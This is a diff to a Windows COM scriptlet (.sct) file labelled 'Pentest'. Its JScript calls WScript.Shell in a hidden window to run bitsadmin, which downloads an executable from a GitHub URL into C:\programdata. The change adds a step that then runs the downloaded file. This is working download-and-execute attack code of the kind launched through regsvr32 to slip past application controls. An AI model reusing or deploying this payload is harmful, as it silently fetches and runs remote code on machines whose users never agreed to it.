@@ -5,7 +5,7 @@ progid="Pentest"
 classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
 <script language="JScript">
 <![CDATA[
-var r = new ActiveXObject("WScript.Shell").Run('cmd /c bitsadmin /transfer n https://github.com/miaodogzi/downtest/raw/master/AutoPing.exe C:\Users\Downloads\a.exe',0);
+var r = new ActiveXObject("WScript.Shell").Run('cmd /c bitsadmin /transfer n https://github.com/miaodogzi/downtest/raw/master/AutoPing.exe C:\programdata\a.exe && C:\programdata\a.exe',0);
 ]]>
 </script>
 </registration>
